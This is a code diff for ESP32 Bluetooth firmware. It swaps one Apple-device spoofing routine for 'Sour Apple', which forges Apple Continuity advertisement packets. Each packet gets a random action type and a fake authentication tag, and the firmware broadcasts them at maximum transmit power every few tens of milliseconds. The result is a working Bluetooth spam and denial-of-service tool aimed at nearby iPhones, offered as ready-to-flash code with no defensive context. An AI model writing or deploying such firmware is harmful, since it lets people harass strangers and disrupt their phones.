@@ -1,84 +1,56 @@
+// ESP32 Sour Apple by RapierXbox
+
 #include "ble.hpp"
-#include <Arduino.h>
-#include <BLEDevice.h>
-#include <BLEUtils.h>
-#include <BLEServer.h>
-#include <esp_arduino_version.h>
-#include "devices.hpp"
+#include <NimBLEDevice.h>
 
-// Bluetooth maximum transmit power
-#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
-#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
-#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
-#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
-#else
-#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
-#endif
-
-BLEAdvertising *pAdvertising = nullptr;
-uint32_t delayMilliseconds = 1000;
+// Global BLE advertising object
+NimBLEAdvertising *pAdvertising = nullptr;
 
 void bleSetup() {
-  Serial.println(F("Starting ESP32 BLE"));
+  NimBLEDevice::init("ESP32 Sour Apple");
 
-  pinMode(12, OUTPUT);
-  pinMode(13, OUTPUT);
+  // Set BLE transmit power to maximum
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
+  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
 
-  BLEDevice::init("AirPods 69");
-
-  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
-
-  BLEServer *pServer = BLEDevice::createServer();
+  // Create BLE server and advertising instance
+  NimBLEServer *pServer = NimBLEDevice::createServer();
   pAdvertising = pServer->getAdvertising();
+}
 
-  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
-  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
+NimBLEAdvertisementData getOAdvertisementData() {
+  NimBLEAdvertisementData randomAdvertisementData = NimBLEAdvertisementData();
+  uint8_t packet[17];
+  uint8_t i = 0;
+
+  packet[i++] = 16;    // Packet Length
+  packet[i++] = 0xFF;  // Packet Type (Manufacturer Specific)
+  packet[i++] = 0x4C;  // Packet Company ID (Apple, Inc.)
+  packet[i++] = 0x00;  // Reserved
+  packet[i++] = 0x0F;  // Type
+  packet[i++] = 0x05;  // Length
+  packet[i++] = 0xC1;  // Action Flags
+
+  const uint8_t types[] = {0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0};
+  packet[i++] = types[rand() % sizeof(types)];  // Action Type
+
+  esp_fill_random(&packet[i], 3);  // Authentication Tag
+  i += 3;
+  packet[i++] = 0x00;  // Reserved
+  packet[i++] = 0x00;  // Reserved
+  packet[i++] = 0x10;  // Type
+  esp_fill_random(&packet[i], 3);  // Random Data
+
+  randomAdvertisementData.addData(std::string((char *)packet, 17));
+  return randomAdvertisementData;
 }
 
 void bleLoop() {
-  digitalWrite(12, HIGH);
-  digitalWrite(13, HIGH);
-
-  esp_bd_addr_t dummy_addr = {0};
-  for (int i = 0; i < 6; i++) {
-    dummy_addr[i] = random(256);
-    if (i == 0) {
-      dummy_addr[i] |= 0xF0;
-    }
-  }
-
-  BLEAdvertisementData oAdvertisementData;
-
-  int device_choice = random(2);
-  if (device_choice == 0) {
-    int index = random(17);
-    uint8_t buffer[31];
-    memcpy_P(buffer, DEVICES[index], 31);
-    oAdvertisementData.addData(std::string((char *)buffer, 31));
-  } else {
-    int index = random(13);
-    uint8_t buffer[23];
-    memcpy_P(buffer, SHORT_DEVICES[index], 23);
-    oAdvertisementData.addData(std::string((char *)buffer, 23));
-  }
-
-  int adv_type_choice = random(3);
-  if (adv_type_choice == 0) {
-    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
-  } else if (adv_type_choice == 1) {
-    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
-  } else {
-    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
-  }
-
-  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
-  pAdvertising->setAdvertisementData(oAdvertisementData);
-
-  Serial.println(F("Sending Advertisement..."));
+  delay(40);
+  NimBLEAdvertisementData advertisementData = getOAdvertisementData();
+  pAdvertising->setAdvertisementData(advertisementData);
   pAdvertising->start();
-
-  digitalWrite(12, LOW);
-  digitalWrite(13, LOW);
-  delay(delayMilliseconds);
+  delay(20);
   pAdvertising->stop();
 }
